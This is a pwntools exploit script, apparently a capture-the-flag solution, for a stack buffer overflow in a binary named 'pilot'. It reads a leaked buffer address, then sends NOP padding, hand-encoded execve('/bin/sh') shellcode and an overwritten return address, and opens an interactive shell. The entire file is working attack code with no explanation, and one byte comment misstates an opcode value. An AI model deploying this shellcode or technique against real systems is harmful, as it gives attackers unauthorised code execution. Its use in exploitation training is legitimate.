#!/usr/bin/env python

from pwn import *
import sys


def main(argv):
    executable="./pilot"
    if len(argv) < 2:
        print("Usage: "+str(argv[0]) +' <d> debug; <r> remote; <l> local')
        return
    if (argv[1] == 'd'):
        log.info("Debug")
        target = gdb.debug(executable,'''
            gef restore
            tmux-setup
            b *0x400b35
            continue
            ''')
    elif (argv[1] == 'r'):
        log.info("Remote target")
        target=remote("127.0.0.1","31337")
    else:
        target=process(executable)
    target.recvuntil("Location:")
    buffer = int(target.recvline().strip(),16)
    log.success("Buffer location: "+hex(buffer))
    shellcode = b"\xB0\xFF\x48\x29\xC4" # mov al, 0xff; sub rsp, rax
    shellcode+= b'\x48\x31\xC0\x50' # xor rax,rax; push rax
    shellcode+= b'\x48\xB8\x2F\x2F\x62\x69\x6e\x2f\x73\x68\x50' #mov rax, /bin/sh; push rax
    shellcode+= b'\x48\x31\xC0' # xor rax,rax
    shellcode+= b'\xB0\x3B' # mov al, 0x3d
    shellcode+= b'\x48\x89\xE7' # mov rdi, rsp
    shellcode+= b'\x48\x31\xF6' # xor rsi,rsi
    shellcode+= b'\x48\x31\xD2' # xor rdx,rdx
    shellcode+= b'\x0F\x05' #syscall
    if len(shellcode) > 0x28:
        log.failure("Shellcode too long :(")
    payload = asm('nop')*(0x28 - len(shellcode))+shellcode+p64(buffer) + b'/bin/bash\x00\x00\x00'
    target.send(payload)
    target.interactive()
    

if __name__ == "__main__":
    main(sys.argv)
